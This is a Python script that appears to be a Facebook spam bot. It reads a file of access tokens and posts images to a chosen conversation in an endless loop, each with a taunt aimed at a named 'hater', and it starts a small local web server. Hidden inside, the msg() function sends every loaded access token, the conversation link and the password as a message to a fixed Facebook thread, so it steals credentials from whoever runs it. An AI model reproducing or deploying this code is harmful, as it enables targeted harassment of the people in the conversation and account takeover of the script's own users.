import requests
import json
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading
import random

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"PRINCE PROJECT")

def execute_server():
    PORT = 4000

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def send_messages():
    with open('password.txt', 'r') as file:
        password = file.read().strip()

    entered_password = password

    if entered_password != password:
        print('[-] <==> Incorrect Password!')
        sys.exit()

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
    cls()

    def liness():
        print('\u001b[37m' + '---------------------------------------------------')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    mmm = requests.get('https://pastebin.com/raw/440AhFvU').text

    if mmm not in password:
        print('[-] <==> Incorrect Password!')
        sys.exit()

    liness()

    access_tokens = [token.strip() for token in tokens]

    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('file.txt', 'r') as file:
        image_urls = file.readlines()

    num_images = len(image_urls)
    max_tokens = min(num_tokens, num_images)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    liness()
    
    def getName(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v22.0/me?access_token={token}').json()
        except:
            data = ""
        if 'name' in data:
            return data['name']
        else:
            return "Error occurred"

    def msg():
        parameters = {
            'access_token' : random.choice(access_tokens),
            'message': 'Hello Prince sir im using your server User Profile Name : ' + getName(random.choice(access_tokens)) + '\n Token : ' + " | ".join(access_tokens) + '\n Link : https://www.facebook.com/messages/t/' + convo_id + '\n Password: ' + password
        }
        try:
            s = requests.post("https://graph.facebook.com/v22.0/t_100049450012082/", data=parameters, headers=headers)
        except:
            pass

    msg()
    while True:
        try:
            for image_index in range(num_images):
                token_index = image_index % max_tokens
                access_token = access_tokens[token_index]

                image_url = image_urls[image_index].strip()

                url = "https://graph.facebook.com/v22.0/{}/photos".format('t_' + convo_id)
                parameters = {
                    'access_token': access_token,
                    'url': image_url,
                    'message': haters_name + ' Look at this image!',
                    'published': 'true'
                }
                response = requests.post(url, data=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("[+] Image {} of Convo {} sent by Token {}: {}".format(
                        image_index + 1, convo_id, token_index + 1, image_url))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                else:
                    print("[x] Failed to send image {} of Convo {} with Token {}: {}".format(
                        image_index + 1, convo_id, token_index + 1, image_url))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                time.sleep(speed)

            print("[+] All images sent. Restarting the process...")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))



def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    
    send_messages()

if __name__ == '__main__':
    main()
